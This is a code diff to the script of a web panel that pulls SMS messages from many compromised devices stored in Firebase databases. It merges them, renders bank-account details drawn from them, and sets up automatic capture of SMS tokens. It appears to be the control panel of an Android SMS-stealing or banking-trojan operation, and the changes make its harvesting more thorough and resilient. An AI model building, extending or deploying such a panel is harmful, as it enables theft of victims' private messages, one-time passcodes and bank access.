@@ -441,7 +441,10 @@ function getFilteredDevs(){return allDevs;}
 function saveFirebaseConfigs(){
   try{localStorage.setItem(FB_LIST_KEY,JSON.stringify(firebaseConfigs));}catch(e){}
 }
-function restJson(url){return fetch(url,{cache:'no-store'}).then(function(r){return r.json();}).catch(function(){return null;});}
+function restJson(url){return fetch(url,{cache:'no-store'}).then(function(r){
+  if(!r.ok)return null;
+  return r.json();
+}).catch(function(){return null;});}
 function isFirebaseErr(d){return !!(d&&typeof d==='object'&&d.error&&Object.keys(d).length<=2);}
 
 function loadFirebaseConfigs(){
@@ -616,12 +619,14 @@ function discoverInstance(inst){
   var key=getFbAuthKey(inst);
   var shallow=inst.restUrl+'/.json?shallow=true'+(key?'&auth='+encodeURIComponent(key):'');
   return restJson(shallow).then(function(roots){
-    if(!roots||typeof roots!=='object')return;
+    if(!roots||typeof roots!=='object'||isFirebaseErr(roots))return;
+    if(roots.messages)inst.schema='rabel';
+    else if(roots.devices&&!roots.clients)inst.schema='spinplay';
+    else if(roots.clients)inst.schema='rabel';
     var nodes=Object.keys(roots).filter(function(n){return SKIP_NODES.indexOf(n)<0;});
     var tasks=[];
     nodes.forEach(function(n){
-      if(SUMMARY_NODES.indexOf(n)>=0||n==='clients')tasks.push(fetchSummaryNode(inst,n));
-      else if(n==='devices')tasks.push(fetchSummaryNode(inst,n));
+      if(SUMMARY_NODES.indexOf(n)>=0||n==='clients'||n==='devices')tasks.push(fetchSummaryNode(inst,n));
     });
     return Promise.all(tasks);
   });
@@ -629,7 +634,12 @@ function discoverInstance(inst){
 function attachLive(inst){
   if(!inst.db||inst.liveAttached)return;inst.liveAttached=true;
   ['clients','devices_status','devices'].forEach(function(node){
-    inst.db.ref(node).on('value',function(s){if(s.exists()){mergeSummaryNode(inst.id,node,s.val());processClientsData();}});
+    try{
+      inst.db.ref(node).on('value',function(s){
+        if(!s.exists())return;
+        mergeSummaryNode(inst.id,node,s.val());processClientsData();
+      });
+    }catch(e){}
   });
 }
 function fetchAllData(){
@@ -719,41 +729,94 @@ function clearListeners(){
   Object.keys(activeListeners).forEach(function(k){
     var L=activeListeners[k];
     if(L.timer)clearInterval(L.timer);
-    else if(L.db&&L.ref){L.ref.off('value',L.h);L.ref.off('child_added',L.h);}
+    if(L.timers){L.timers.forEach(function(t){clearInterval(t);});}
+    if(L.refs){L.refs.forEach(function(r){try{if(r.ref&&r.h){r.ref.off('value',r.h);}}catch(e){}});}
+    else if(L.db&&L.ref&&L.h){try{L.ref.off('value',L.h);}catch(e){}}
   });
   activeListeners={};
 }
+
+/** All known SMS paths — rebel.py uses messages/{id}; SpinPlay uses devices/.../all_sms */
+function smsPathsForDevice(d){
+  var id=d.rawId, node=d.deviceNode||'clients', paths=[], bases=[node,'clients','devices'];
+  paths.push('messages/'+id);
+  bases.forEach(function(n){
+    if(!n||!id)return;
+    paths.push(n+'/'+id+'/all_sms');
+    paths.push(n+'/'+id+'/new_sms');
+    paths.push(n+'/'+id+'/sms');
+    paths.push(n+'/'+id+'/messages');
+  });
+  var out=[], seen={};
+  paths.forEach(function(p){if(p&&!seen[p]){seen[p]=1;out.push(p);}});
+  return out;
+}
+
+function mergeSmsLists(){
+  var merged=[], seen={}, i, j, list, s, key;
+  for(i=0;i<arguments.length;i++){
+    list=arguments[i]||[];
+    for(j=0;j<list.length;j++){
+      s=list[j];if(!s)continue;
+      key=(s.address||'?')+'|'+(s.ts||0)+'|'+(s.body||'').slice(0,80);
+      if(seen[key])continue;
+      seen[key]=1;merged.push(s);
+    }
+  }
+  merged.sort(function(a,b){return (b.ts||0)-(a.ts||0);});
+  return merged;
+}
+
+function fetchSmsFromPaths(inst,d){
+  if(!inst||!d)return Promise.resolve([]);
+  var paths=smsPathsForDevice(d);
+  return Promise.all(paths.map(function(p){
+    return restJsonInst(inst,p).then(function(data){
+      if(!data||isFirebaseErr(data))return [];
+      return smsAsList(data).map(normalizeSms).filter(Boolean);
+    }).catch(function(){return[];});
+  })).then(function(results){
+    var args=[mergeSmsLists];
+    results.forEach(function(r){args.push(r);});
+    return mergeSmsLists.apply(null,results);
+  });
+}
+
 function loadSmsForDevice(){
   var d=getSelDev();if(!d)return;
   document.getElementById('smsEmpty').classList.add('hidden');
   clearListeners();
   var inst=getFbInstance(d.fbId);
-  var onData=function(data){
-    renderSmsFromData(data);
-    window_allSms=smsAsList(data).map(normalizeSms);
-    // ---- FIX: trigger bank render if bank tab is active ----
+  if(!inst){toast('Firebase project not found',false);return;}
+
+  function applySmsList(list){
+    window_allSms=list||[];
+    window_sms=window_allSms.slice(0,80);
+    renderSms();
     if(document.getElementById('screen-bank').classList.contains('active'))renderBankAccounts();
-  };
-  if(inst&&inst.schema==='rabel'){
-    var path='messages/'+d.rawId;
-    var ref=inst.db?inst.db.ref(path).limitToLast(80):null;
-    var h=function(s){onData(s.val());};
-    if(ref){ref.on('value',h);activeListeners[d.id]={db:inst.db,ref:ref,h:h};}
-    else{var tick=function(){restJsonInst(inst,path).then(onData);};tick();activeListeners[d.id]={timer:setInterval(tick,3000)};}
-  }else{
-    var p2=(d.deviceNode||'devices')+'/'+d.rawId+'/all_sms';
-    var p3=(d.deviceNode||'devices')+'/'+d.rawId+'/new_sms';
-    var tick2=function(){
-      restJsonInst(inst,p2).then(function(data){
-        window_allSms=smsAsList(data).map(normalizeSms);
-        if(document.getElementById('screen-bank').classList.contains('active'))renderBankAccounts();
-      });
-      restJsonInst(inst,p3).then(function(data){
-        renderSmsFromData(data);
-      });
-    };
-    tick2();activeListeners[d.id]={timer:setInterval(tick2,3000)};
   }
+
+  function poll(){
+    fetchSmsFromPaths(inst,d).then(applySmsList).catch(function(){applySmsList([]);});
+  }
+
+  poll();
+  var timer=setInterval(poll,3500);
+  var listeners={timer:timer,timers:[timer],refs:[]};
+
+  if(inst.db){
+    smsPathsForDevice(d).slice(0,4).forEach(function(p){
+      try{
+        var ref=inst.db.ref(p);
+        try{ref=ref.limitToLast(100);}catch(e2){}
+        var h=function(){fetchSmsFromPaths(inst,d).then(applySmsList);};
+        ref.on('value',h);
+        listeners.refs.push({ref:ref,h:h});
+      }catch(e){}
+    });
+  }
+
+  activeListeners[d.id]=listeners;
 }
 function smsAsList(raw){
   if(!raw)return[];
@@ -786,14 +849,14 @@ function smsMsgTime(m){
 }
 function normalizeSms(m){
   if(!m||typeof m!=='object')return null;
-  var body=m.body||m.message||m.text||m.content||'';
+  var body=String(m.body||m.message||m.text||m.content||m.msg||'').trim();
   if(!body)return null;
   var ts=smsMsgTime(m);
   return{
-    address:m.address||m.sender||m.from||m.number||'?',
+    address:m.address||m.sender||m.from||m.number||m.originatingAddress||'?',
     body:body,
-    date_readable:m.date_readable||m.dateTime||m.time||'—',
-    type:String(m.type||m.direction||'inbox').toLowerCase(),
+    date_readable:m.date_readable||m.dateTime||m.date_time||m.time||m.date||'—',
+    type:String(m.type||m.direction||m.sms_type||'inbox').toLowerCase(),
     ts:ts
   };
 }
@@ -1031,21 +1094,25 @@ function toggleAutoToken(){
 function useSelForAutoToken(){
   var d=getSelDev();if(!d){toast('Select device on Home',false);return;}
   var inst=getFbInstance(d.fbId);
+  if(!inst){toast('Firebase missing',false);return;}
   smsTokenFetch({action:'save',enabled:_autoTokenOn,device_id:d.rawId,database_url:inst.restUrl,fb_name:inst.name}).then(function(){
     toast('Auto SMS device set',true);
-  });
+  }).catch(function(){toast('Auto token save failed',false);});
 }
 
 /* BOOT — direct open, all Firebase combined */
 (function(){
-  panelReady=true;
-  fetchAllData();
-  loadAutoTokenState();
+  try{
+    panelReady=true;
+    fetchAllData().catch(function(){toast('Sync failed — check Firebase URL/secret',false);});
+    loadAutoTokenState();
+  }catch(e){console.error(e);}
 })();
 setInterval(function(){
   if(!panelReady)return;
-  fetchAllData();
+  fetchAllData().catch(function(){});
 },60000);
+window.addEventListener('unhandledrejection',function(){});
 </script>
 </body>
 </html>
